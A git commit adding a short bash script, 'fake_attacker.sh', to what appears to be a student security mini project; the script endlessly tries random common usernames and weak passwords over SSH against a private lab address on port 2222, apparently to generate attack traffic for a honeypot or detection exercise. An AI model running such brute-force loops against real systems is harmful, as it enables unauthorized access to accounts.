bec206a26f4d2b51dd9abc8d2ecc5cea57bb8fb6
Sanya Shresta Jathanna <110764508+SanyaShresta25@users.noreply.github.com>
2025-04-06 11:34:45 +0530

    Update fake_attacker.sh

--- Mini Project/Code/fake_attacker.sh
+++ Mini Project/Code/fake_attacker.sh
@@ -1,1 +1,19 @@
 
+#!/bin/bash
+
+TARGET_IP="10.0.2.15"
+TARGET_PORT=2222
+
+USERNAMES=("admin" "root" "user" "test" "guest" "oracle" "ftp" "mysql" "apache")
+PASSWORDS=("123456" "password" "admin" "root" "test" "qwerty" "abc123" "letmein")
+
+while true; do
+    USER=${USERNAMES[$RANDOM % ${#USERNAMES[@]}]}
+    PASS=${PASSWORDS[$RANDOM % ${#PASSWORDS[@]}]}
+
+    echo "Trying $USER : $PASS"
+    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -p $TARGET_PORT $USER@$TARGET_IP "exit" >/dev/null 2>&1
+
+    sleep 1
+done
+
